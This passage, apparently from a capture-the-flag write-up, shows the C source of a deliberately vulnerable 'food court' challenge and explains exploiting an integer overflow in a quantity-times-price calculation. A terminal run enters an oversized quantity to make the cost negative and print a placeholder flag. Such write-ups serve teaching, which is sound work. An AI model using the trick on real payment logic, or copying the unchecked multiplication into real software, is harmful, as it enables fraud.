&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;initialize&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;alarm&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;60&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;setvbuf&lt;&#x2F;span&gt;&lt;span&gt;(stdout&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; _IONBF&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;setvbuf&lt;&#x2F;span&gt;&lt;span&gt;(stderr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; _IONBF&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;setvbuf&lt;&#x2F;span&gt;&lt;span&gt;(stdin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; _IONBF&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; item&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Welcome to RGUKT Food Court!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;We are giving free 200 RS wallet amount to our online customers.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Sadly, you don&amp;#39;t have enough money to buy the tastiest dish named Flag :&#x2F;? Or is it? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Wallet Amount Rs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; wallet)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Menu: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1. Noodles: 50&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2. Biryani: 100&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3. Soft Drink: 20&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;4. Flag: Rs 1000&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0. Logout&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Which item would you like to Order?&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;scanf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt;item)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;switch &lt;&#x2F;span&gt;&lt;span&gt;(item) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Logging out&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;order&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Nooooodles&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;order&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Dum Biryani&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;order&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Soft Drink&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;order&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;buy the today&amp;#39;s special dish - flag&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;                    FILE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;fp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;fopen&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;flag.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;r&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt; flag[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(fp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;                        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Create flag.txt in the current working directory&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Please report to admin if you saw this error on remote&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;fgets&lt;&#x2F;span&gt;&lt;span&gt;(flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;sizeof&lt;&#x2F;span&gt;&lt;span&gt;(flag)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; fp)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(flag)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                }
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;default&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Please select a valid item.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The Main method is printing the menu and asking the user for the choice.Initially my &lt;code&gt;wallet = 200&lt;&#x2F;code&gt;.i.e balance. I am able to buy anything from the foodcourt except flag, cause it costs 1000. In order function i have to enter number of items i want to buy,i.e &lt;code&gt;n&lt;&#x2F;code&gt;. The cost is going to be multiplied with the number of items &lt;code&gt;cost = cost * n&lt;&#x2F;code&gt;. My balance then its going to place my order. i.e &lt;code&gt;cost &amp;lt;= wallet&lt;&#x2F;code&gt;. Then my balance is going to be update. &lt;code&gt;wallet = wallet - cost&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Here i got an ideaaaa.. I see noodles costs 50 and it substracts the total cost from the wallet.but what if the cost is negative? Then the cost is going to be added to the wallet, and if cost is negative enough, then we can get a huge wallet balance.&lt;&#x2F;p&gt;
&lt;p&gt;How do we get a negative cost? Notice the cost is multiplied with n. &lt;code&gt;cost = cost * n&lt;&#x2F;code&gt;. So, that if we make the n as negative the cost becomes negative.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;n&lt;&#x2F;code&gt; is declared as integer , specially a signed integer. So i have to give a number out of signed int range.&lt;&#x2F;p&gt;
&lt;p&gt;signed int range for&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;2 bytes(-32,768 to 32,767)&lt;&#x2F;li&gt;
&lt;li&gt;4 bytes(-2,147,483,648 to 2,147,483,647)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The input is multiplied with 1000 and to get an overflow we have to enter a number which gives the result greater than 2,147,483,647.
So, if i enter number greater than 21474835 the result will be in out of range.&lt;&#x2F;p&gt;
&lt;p&gt;Lets Get That Fa Fa Flag .. &lt;code&gt;*_~&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; gcc food-court-overflow.c
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; .&#x2F;a.out
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Welcome&lt;&#x2F;span&gt;&lt;span&gt; to RGUKT Food Court!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;We&lt;&#x2F;span&gt;&lt;span&gt; are giving free 200 RS wallet amount to our online customers.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Sadly,&lt;&#x2F;span&gt;&lt;span&gt; you dont have enough money to buy the tastiest dish named Flag :&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?&lt;&#x2F;span&gt;&lt;span&gt; Or is it&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;? 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Wallet&lt;&#x2F;span&gt;&lt;span&gt; Amount Rs200.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Menu: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1.&lt;&#x2F;span&gt;&lt;span&gt; Noodles: 50
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;2.&lt;&#x2F;span&gt;&lt;span&gt; Biryani: 100
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;3.&lt;&#x2F;span&gt;&lt;span&gt; Soft Drink: 20
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;4.&lt;&#x2F;span&gt;&lt;span&gt; Flag: Rs 1000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0.&lt;&#x2F;span&gt;&lt;span&gt; Logout
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Which&lt;&#x2F;span&gt;&lt;span&gt; item would you like to Order&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Input&lt;&#x2F;span&gt;&lt;span&gt; the number of buy the todays special dish - flag you want to buy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;21474836
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;That&lt;&#x2F;span&gt;&lt;span&gt; will cost Rs-480.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Order&lt;&#x2F;span&gt;&lt;span&gt; placed!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;InvaderCTF{this_is_not_flag_flag_is_on_the_remote_server&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Wallet&lt;&#x2F;span&gt;&lt;span&gt; Amount Rs680.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Menu: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1.&lt;&#x2F;span&gt;&lt;span&gt; Noodles: 50
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;2.&lt;&#x2F;span&gt;&lt;span&gt; Biryani: 100
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;3.&lt;&#x2F;span&gt;&lt;span&gt; Soft Drink: 20
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;4.&lt;&#x2F;span&gt;&lt;span&gt; Flag: Rs 1000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0.&lt;&#x2F;span&gt;&lt;span&gt; Logout
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Which&lt;&#x2F;span&gt;&lt;span&gt; item would you like to Order&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
